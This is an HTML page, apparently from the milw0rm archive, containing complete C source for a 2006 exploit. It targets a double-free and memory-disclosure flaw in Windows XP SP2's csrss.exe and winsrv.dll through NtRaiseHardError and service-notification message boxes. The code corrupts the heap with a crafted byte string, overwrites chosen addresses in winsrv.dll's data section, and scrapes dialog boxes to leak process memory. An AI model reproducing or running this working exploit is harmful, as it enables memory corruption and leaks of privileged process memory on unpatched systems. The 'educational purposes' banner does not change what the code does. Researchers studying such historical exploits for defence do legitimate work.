<html><head><title>MS Windows NtRaiseHardError Csrss.exe-winsrv.dll Double Free</title></head><pre>/////////////////////////////////////////
/////////////////////////////////////////
///// Microsoft Windows NtRaiseHardError 
///// Csrss.exe-winsrv.dll Double Free  
/////////////////////////////////////////
///// Ruben Santamarta  
///// ruben at reversemode dot com
///// www.reversemode.com 
/////////////////////////////////////////
///// 12.29.2006
///// For educational purposes ONLY
///// Compiled using gcc (Dev-C++)
////////////////////////////////////////
////// XP SP2
////////////////////////////////////////


#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;
#include &lt;winbase.h&gt;
#include &lt;ntsecapi.h&gt;

#define UNICODE
#define MAGIC_VALUE 0x75b4cd40  // winsrv.dll data section


BOOL gFon=FALSE;

typedef LONG NTSTATUS;
typedef NTSTATUS (WINAPI *PNTRAISE)(NTSTATUS, 
                                    ULONG,
                                    ULONG,
                                    PULONG,
                                    UINT,
                                    PULONG);    

// Csrss.exe memory monitor thread
// (Read csrss.exe memory disclosure exploit for details)

VOID WINAPI ReadBox2( LPVOID param ) 
{ 

	HWND hWindow,hButton,hText;
	DWORD hChunk,cHeader=0;
    int i=0,b=0;
	int gTemp;
	char lpTitle[300];
	char lpText[300];
	char lpBuff[500];
	ZeroMemory((LPVOID)lpTitle,250);
    ZeroMemory((LPVOID)lpText,250);
    ZeroMemory((LPVOID)lpBuff,300);
    Sleep(2000);
    
    for (;;)
	{
	
		lpText[0]=(BYTE)&quot;&quot;;
        Sleep(1000);
		hWindow = FindWindow(&quot;#32770&quot;,NULL);
		ZeroMemory((LPVOID)lpTitle,250);
    	ZeroMemory((LPVOID)lpText,250);
    	ZeroMemory((LPVOID)lpBuff,300);
        
        if(hWindow != NULL)
		{
			GetWindowText(hWindow,(LPSTR)&amp;lpTitle,250);
		    
            if(strcmp(lpTitle,&quot;Aa&quot;)!=0)
		    {
    			hText=FindWindowEx(hWindow,0,&quot;static&quot;,0);
    		    
    			GetWindowText(hText,(LPSTR)&amp;lpText,250);
    			hText=GetNextWindow(hText,GW_HWNDNEXT);
    			
                GetWindowText(hText,(LPSTR)&amp;lpText,250);
    		 
                cHeader=*(DWORD*)lpText;
                if( cHeader!=0)
                {
                      
                      if(cHeader &gt;0x100000 &amp;&amp; cHeader&lt;0x400000)
                      {     
                            printf(&quot;\n**************************\n&quot;);
                            printf(&quot;Heap Chunk Found! Good Luck!\n&quot;);
                             printf(&quot;New Value: 0x%p&quot;,cHeader);
                           printf(&quot;\n**************************\n&quot;);
                            
                      }
                      else
                      {
                          printf(&quot;\n****************************\n&quot;);
                            printf(&quot;winsrv.dll data overwritten! \n&quot;);
                            printf(&quot;New Value: 0x%p&quot;,cHeader);
                            printf(&quot;\n****************************\n&quot;);
                           
                      }
                }  
                 else
                {
                    printf(&quot;\n****************************\n&quot;);
                    printf(&quot;nothing found! &quot;);
                    printf(&quot;\n****************************\n&quot;);
                }  
                
                cHeader=*(DWORD*)lpTitle;
                if( cHeader!=0)
                {
                      
                      if(cHeader &gt;0x100000 &amp;&amp; cHeader&lt;0x400000)
                      {     
                            printf(&quot;\n**************************\n&quot;);
                            printf(&quot;Heap Chunk Found! Good Luck!\n&quot;);
                             printf(&quot;New Value: 0x%p&quot;,cHeader);
                           printf(&quot;\n**************************\n&quot;);
                            
                      }
                      else
                      {
                          printf(&quot;\n****************************\n&quot;);
                            printf(&quot;winsrv.dll data overwritten! \n&quot;);
                            printf(&quot;New Value: 0x%p&quot;,cHeader);
                            printf(&quot;\n****************************\n&quot;);
                           
                      }
                }    
                else
                {
                    printf(&quot;\n****************************\n&quot;);
                    printf(&quot;nothing found! &quot;);
                    printf(&quot;\n****************************\n&quot;);
                }
                
            }
            
            SendMessage(hWindow,WM_CLOSE,0,0); 
   			ZeroMemory((LPVOID)lpTitle,250);
    		ZeroMemory((LPVOID)lpText,250);
    		ZeroMemory((LPVOID)lpBuff,300);
        }
        CloseHandle(hWindow);
	}

}

VOID WINAPI ReadBox( LPVOID param ) 
{ 

	HWND hWindow;
	
    for (;;)
	{
        Sleep(1000);
		if(!gFon)
        {
                 hWindow = FindWindow(&quot;#32770&quot;,NULL);
		
                 if(hWindow != NULL )
		         {
                  SendMessage(hWindow,WM_CLOSE,0,0);
                  }
        }
	}

}


int main()
{
 
 
   UNICODE_STRING uStr={5,5,L&quot;fun!&quot;};
   ULONG retValue,args[]={MAGIC_VALUE,MAGIC_VALUE,(ULONG)&amp;uStr};
   PNTRAISE NtRaiseHardError; 
   DWORD dwThreadId;  

   byte  *ShellCode =&quot;\x5C\x3F\x3F\x5C\x40\xcd\xb4\x75\x40\xcd\xb4\x75&quot;
                     &quot;\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75&quot;
                     &quot;\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75&quot;
                     &quot;\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75&quot;
                     &quot;\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75&quot;
                     &quot;\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75&quot;
                     &quot;\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75&quot;
                     &quot;\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75&quot;
                     &quot;\x40\xcd\xb4\x75\x40\xcd\xb4\x75\x40\xcd\xb4\x75&quot;
                     &quot;\x40\xcd\xb4\x75\x40\xcd\xb4\x75&quot;;
                     
   int i=0;
   
   NtRaiseHardError=(PNTRAISE)GetProcAddress(GetModuleHandle(&quot;ntdll.dll&quot;),
                                               &quot;NtRaiseHardError&quot;);  
	system(&quot;cls&quot;);
    printf(&quot;##########################################\n&quot;);
    printf(&quot;### Microsoft Windows NtRaiseHardError ###\n&quot;);
    printf(&quot;### Csrss.exe-winsrv.dll Double-Free   ###\n&quot;);
    printf(&quot;## Ruben Santamarta www.reversemode.com ##\n&quot;);
    printf(&quot;##########################################\n&quot;);
  	printf(&quot;## + Csrss.exe Double-Free     Exploit  ##\n&quot;);
  	printf(&quot;## + Csrss.exe Memory Disclosure Exploit##\n&quot;);
  	printf(&quot;##########################################\n&quot;);
    printf(&quot;# XP SP 2                                #\n&quot;);
  	printf(&quot;##########################################\n\n&quot;);
    printf(&quot;\nThe exploit overwrites controlled addresses\n&quot;);
  	printf(&quot;in winsrv.dll data section within Csrss.exe\n\n&quot;);
   	
    CreateThread( NULL,              
				  0,                  
				 (LPTHREAD_START_ROUTINE)ReadBox,        
				  0,             
				  0,                 
				 &amp;dwThreadId);
   
   // Seeding the heap               
   for(i=0;i&lt;2;i++) MessageBoxA(0,&quot;\x40\xcd\xb4\x75&quot;,&quot;\x40\xcd\xb4\x75&quot;, MB_SERVICE_NOTIFICATION);
	
   // Exploiting Csrss.exe Double-Free 
   
   printf(&quot;[*] Stage 1 -= Hitting Heap =-\n\n&quot;)	;		 
   printf(&quot;[+] Corrupting the heap (11 attemps)\n\n&quot;);
    
   for( i=0; i&lt;11; i++)
   {
           
           printf(&quot;#%d... &quot;,i+1); 
           MessageBoxA(0, ShellCode,&quot;A&quot;, MB_SERVICE_NOTIFICATION);
   }
    
    gFon=TRUE;
  
    printf(&quot;\n\n[*] Stage 2 -= Scanning winsrv.dll data section =-\n\n&quot;) ; 
    Sleep(2000);
    
    CreateThread( NULL,              
				  0,                  
				 (LPTHREAD_START_ROUTINE)ReadBox2,        
				  0,             
				  0,                 
				 NULL); 
    
    args[0]-=0x20;	 
    
    // Exploiting Csrss.exe memory disclosure flaw
    
    for(i=0;i&lt;0xF;i++)
    {
        args[0]+=4;   
        printf(&quot;\n#%d Reading at : [0x%p]\n&quot;,i,args[0]);                                      
        NtRaiseHardError(0x50000018,3,4,args,1,&amp;retValue);
    }
   
    printf(&quot;\n[+] Exploit exiting\n\n&quot;);
    printf(&quot;#############################################################\n&quot;);
    printf(&quot;If you didn't find anything, run the exploit one more time!\n&quot;);
    printf(&quot;If you find a heap chunk address, enjoy!\n&quot;);
    printf(&quot;#############################################################\n&quot;);
  
  
 }

// milw0rm.com [2006-12-31]</pre></html>